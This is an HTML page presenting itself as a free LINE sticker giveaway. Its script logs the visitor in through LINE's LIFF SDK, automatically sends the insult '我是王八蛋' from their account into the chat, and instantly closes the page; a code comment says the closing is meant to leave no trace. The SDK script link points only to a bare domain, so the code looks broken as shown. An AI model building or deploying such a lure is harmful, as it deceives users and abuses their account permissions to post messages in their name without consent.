<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>限時貼圖免費領取</title>
    <!-- 引入 LINE 官方的 LIFF SDK -->
    <script src="https://line-scdn.net"></script>
</head>
<body>
    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
        <h2>正在載入 LINE 貼圖，請稍候...</h2>
    </div>

    <script>
        // 初始化 LIFF (完全移除測試用的 alert)
        liff.init({ liffId: "2012018749-Jns1tBED" }).then(() => {
            if (!liff.isLoggedIn()) {
                liff.login(); // 沒授權過就引導登入
            } else {
                // 已授權狀態下，直接全自動發送訊息
                liff.sendMessages([{
                    type: 'text',
                    text: '我是王八蛋' 
                }]).then(() => {
                    liff.closeWindow(); // 傳送成功後「立刻自動關閉網頁」，不留痕跡
                }).catch((err) => {
                    console.log(err);
                });
            }
        }).catch((err) => {
            console.log(err);
        });
    </script>
</body>
</html>
